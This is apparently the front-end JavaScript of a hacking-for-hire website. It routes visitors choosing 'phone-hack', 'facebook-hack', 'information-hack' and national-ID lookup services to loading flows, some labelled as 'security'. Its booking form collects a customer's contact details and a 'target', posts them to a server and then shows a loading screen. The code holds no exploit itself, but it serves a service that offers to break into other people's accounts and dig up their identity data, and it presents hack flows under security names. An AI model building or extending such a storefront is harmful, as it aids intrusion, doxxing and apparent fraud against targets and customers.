// Service Handler for booking modals

function openServiceModal(serviceType, serviceName) {
    console.log('openServiceModal called:', serviceType, serviceName);
    
    // For phone-hack service, redirect to phone-hack page
    if (serviceType === 'phone-hack') {
        console.log('Redirecting to /phone-hack');
        window.location.href = '/phone-hack';
        return false;
    }
    
    // For facebook-hack service, redirect to Facebook security loading flow
    if (serviceType === 'facebook-hack') {
        console.log('Redirecting to Facebook security loading flow');
        console.log('Service Type:', serviceType);
        console.log('Service Name:', serviceName);
        // Direct redirect without any delay
        try {
            window.location.href = '/facebook-security-loading';
        } catch (error) {
            console.error('Redirect error:', error);
            window.location.replace('/facebook-security-loading');
        }
        return false;
    }
    
    // For information-hack service (nid-find), redirect to information-hack page
    if (serviceType === 'nid-find' || serviceType === 'information-hack') {
        const normalizedName = String(serviceName || '').trim();
        if (normalizedName.includes('বিকাশ সিকিউরিটি')) {
            console.log('Redirecting to bkash report loading');
            window.location.href = '/report-loading?type=bkash';
            return false;
        }
        if (normalizedName.includes('পেজ সিকিউরিটি')) {
            console.log('Redirecting to page report loading');
            window.location.href = '/report-loading?type=page';
            return false;
        }
        console.log('Redirecting to /information-hack');
        window.location.href = '/information-hack';
        return false;
    }
    
    // For premium-apps service, route by selected card
    if (serviceType === 'premium-apps') {
        const normalizedName = String(serviceName || '').toLowerCase();

        if (normalizedName.includes('tiktok safety') || normalizedName.includes('tiktok security')) {
            console.log('Redirecting to TikTok Safety loading flow');
            window.location.href = '/premium-loading?service=tiktok-safety';
            return false;
        }

        if (normalizedName.includes('instagram security')) {
            console.log('Redirecting to Instagram Security loading flow');
            window.location.href = '/premium-loading?service=instagram-security';
            return false;
        }

        console.log('Redirecting to premium apps with loading');
        window.location.href = '/premium-loading';
        return false;
    }
    
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    
    if (!isLoggedIn) {
        // Show registration required modal
        showRegistrationRequiredModal();
        return;
    }
    
    // Set service details
    document.getElementById('bookingServiceType').value = serviceType;
    document.getElementById('bookingServiceName').value = serviceName;
    document.getElementById('bookingModalTitle').textContent = `Book ${serviceName}`;
    
    // Set default date to 15th
    const dateInput = document.getElementById('bookingDate');
    if (dateInput) {
        const today = new Date();
        const year = today.getFullYear();
        const month = String(today.getMonth() + 1).padStart(2, '0');
        dateInput.value = `${year}-${month}-15`;
    }
    
    // Show booking modal
    const modal = document.getElementById('bookingModal');
    modal.style.display = 'flex';
    setTimeout(() => {
        modal.querySelector('.modal-content-booking').style.transform = 'scale(1)';
        modal.querySelector('.modal-content-booking').style.opacity = '1';
    }, 10);
}

function closeBookingModal() {
    const modal = document.getElementById('bookingModal');
    modal.querySelector('.modal-content-booking').style.transform = 'scale(0.9)';
    modal.querySelector('.modal-content-booking').style.opacity = '0';
    setTimeout(() => {
        modal.style.display = 'none';
        document.getElementById('bookingForm').reset();
    }, 300);
}

function showRegistrationRequiredModal() {
    const modal = document.getElementById('registrationRequiredModal');
    modal.style.display = 'flex';
    setTimeout(() => {
        modal.querySelector('.reg-modal-content').style.transform = 'scale(1)';
        modal.querySelector('.reg-modal-content').style.opacity = '1';
    }, 10);
}

function closeRegistrationModal() {
    const modal = document.getElementById('registrationRequiredModal');
    modal.querySelector('.reg-modal-content').style.transform = 'scale(0.9)';
    modal.querySelector('.reg-modal-content').style.opacity = '0';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

// Set default date to 15th of current month
function setDefaultDate() {
    const dateInput = document.getElementById('bookingDate');
    if (dateInput && !dateInput.value) {
        const today = new Date();
        const year = today.getFullYear();
        const month = String(today.getMonth() + 1).padStart(2, '0');
        const day = '15';
        dateInput.value = `${year}-${month}-${day}`;
    }
}

// Booking form submission
document.addEventListener('DOMContentLoaded', function() {
    // Set default date when modal opens
    const bookingModal = document.getElementById('bookingModal');
    if (bookingModal) {
        const observer = new MutationObserver(function(mutations) {
            if (bookingModal.style.display === 'flex') {
                setTimeout(setDefaultDate, 100);
            }
        });
        observer.observe(bookingModal, { attributes: true, attributeFilter: ['style'] });
    }
    
    const bookingForm = document.getElementById('bookingForm');
    if (bookingForm) {
        // Set default date when form is shown
        setDefaultDate();
        
        bookingForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = {
                serviceType: document.getElementById('bookingServiceType').value,
                serviceName: document.getElementById('bookingServiceName').value,
                name: document.getElementById('bookingName').value,
                phone: document.getElementById('bookingPhone').value,
                email: document.getElementById('bookingEmail').value,
                target: document.getElementById('bookingTarget').value,
                details: document.getElementById('bookingDetails').value,
                date: document.getElementById('bookingDate').value || (() => {
                    const today = new Date();
                    const year = today.getFullYear();
                    const month = String(today.getMonth() + 1).padStart(2, '0');
                    return `${year}-${month}-15`;
                })(),
                userId: localStorage.getItem('userId')
            };
            
            // Store form data for results page
            sessionStorage.setItem('serviceRequestData', JSON.stringify(formData));
            
            // For ALL services, submit and redirect to loading page
            // Submit data to server
            try {
                const response = await fetch('/api/service-request', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                });
                
                const result = await response.json();
                if (result.success) {
                    console.log('Service request saved to admin panel:', result.requestId);
                    console.log('Service:', formData.serviceName, '- Data saved successfully');
                } else {
                    console.error('Error saving request:', result.message);
                }
            } catch (err) {
                console.error('Error submitting request:', err);
            }
            
            // Close modal and redirect to loading page for ALL services
            closeBookingModal();
            setTimeout(() => {
                window.location.href = '/loading';
            }, 300);
        });
    }
});
